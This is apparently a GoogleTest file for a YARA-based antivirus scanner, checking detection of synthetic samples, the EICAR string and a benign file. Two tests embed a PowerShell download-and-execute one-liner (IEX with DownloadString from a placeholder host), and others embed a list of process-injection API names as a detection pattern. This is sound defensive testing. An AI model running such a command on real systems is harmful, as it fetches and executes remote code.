#include <algorithm>
#include <cstdio>
#include <filesystem>
#include <fstream>

#include <gtest/gtest.h>

#include "avstaticscan/yara_engine.hpp"

namespace {

std::string MakeTempFile(const std::string& name, const std::string& content) {
    const auto path = std::filesystem::temp_directory_path() / name;
    std::ofstream out(path, std::ios::binary);
    out << content;
    out.close();
    return path.string();
}

bool HasRule(const std::vector<avcore::DetectionEvent>& detections, const std::string& rule_id) {
    for (const auto& d : detections) {
        if (d.rule_id == rule_id) return true;
    }
    return false;
}

} // namespace

TEST(YaraEngineTest, LoadsStarterRuleSet) {
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);
}

TEST(YaraEngineTest, FlagsSyntheticPowerShellDownloadPattern) {
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);

    const std::string path = MakeTempFile(
        "avsuite_test_suspicious.ps1",
        "powershell.exe -nop -EncodedCommand IEX (New-Object Net.WebClient).DownloadString('http://example.test/p')");

    const auto detections = engine->ScanFile(path);
    EXPECT_TRUE(HasRule(detections, "YARA.Suspicious_PowerShell_EncodedDownload"));
    std::remove(path.c_str());
}

TEST(YaraEngineTest, SeverityComesFromRuleMetaNotHardcoded) {
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);

    // Suspicious_PowerShell_EncodedDownload declares meta: severity = "malicious".
    const std::string malicious_path = MakeTempFile(
        "avsuite_test_severity_malicious.ps1",
        "powershell.exe -nop -EncodedCommand IEX (New-Object Net.WebClient).DownloadString('http://example.test/p')");
    const auto malicious_detections = engine->ScanFile(malicious_path);
    auto malicious_it = std::find_if(malicious_detections.begin(), malicious_detections.end(), [](const auto& d) {
        return d.rule_id == "YARA.Suspicious_PowerShell_EncodedDownload";
    });
    ASSERT_NE(malicious_it, malicious_detections.end());
    EXPECT_EQ(malicious_it->severity, avcore::Severity::Malicious);
    std::remove(malicious_path.c_str());

    // Reflective_Injection_API_Strings declares meta: severity = "suspicious".
    const std::string suspicious_path = MakeTempFile(
        "avsuite_test_severity_suspicious.bin",
        "VirtualAlloc WriteProcessMemory CreateRemoteThread GetProcAddress LoadLibraryA");
    const auto suspicious_detections = engine->ScanFile(suspicious_path);
    auto suspicious_it =
        std::find_if(suspicious_detections.begin(), suspicious_detections.end(),
                      [](const auto& d) { return d.rule_id == "YARA.Reflective_Injection_API_Strings"; });
    ASSERT_NE(suspicious_it, suspicious_detections.end());
    EXPECT_EQ(suspicious_it->severity, avcore::Severity::Suspicious);
    std::remove(suspicious_path.c_str());
}

TEST(YaraEngineTest, FlagsReflectiveInjectionApiStrings) {
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);

    const std::string path = MakeTempFile(
        "avsuite_test_injection_strings.bin",
        "VirtualAlloc WriteProcessMemory CreateRemoteThread GetProcAddress LoadLibraryA");

    const auto detections = engine->ScanFile(path);
    EXPECT_TRUE(HasRule(detections, "YARA.Reflective_Injection_API_Strings"));
    std::remove(path.c_str());
}

TEST(YaraEngineTest, FlagsEicarTestStringInMemory) {
    // Scanned purely in-memory (yr_rules_scan_mem), never written to disk --
    // real-time AV on the build machine (Windows Defender included) treats
    // the EICAR string as a real detection and will quarantine a file
    // containing it on sight, which would make a file-based version flaky.
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);

    static const std::string kEicar =
        "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
    const auto detections = engine->ScanBytes(reinterpret_cast<const std::uint8_t*>(kEicar.data()), kEicar.size(),
                                                "in-memory-eicar-test");
    EXPECT_TRUE(HasRule(detections, "YARA.EICAR_Standard_AV_Test_File"));
}

TEST(YaraEngineTest, BenignFileProducesNoMatches) {
    const auto engine = avstaticscan::YaraEngine::LoadRules(AVSTATICSCAN_RULES_DIR);
    ASSERT_NE(engine, nullptr);

    const std::string path = MakeTempFile("avsuite_test_benign.txt", "just a normal grocery list: eggs, milk, bread");

    const auto detections = engine->ScanFile(path);
    EXPECT_TRUE(detections.empty());
    std::remove(path.c_str());
}
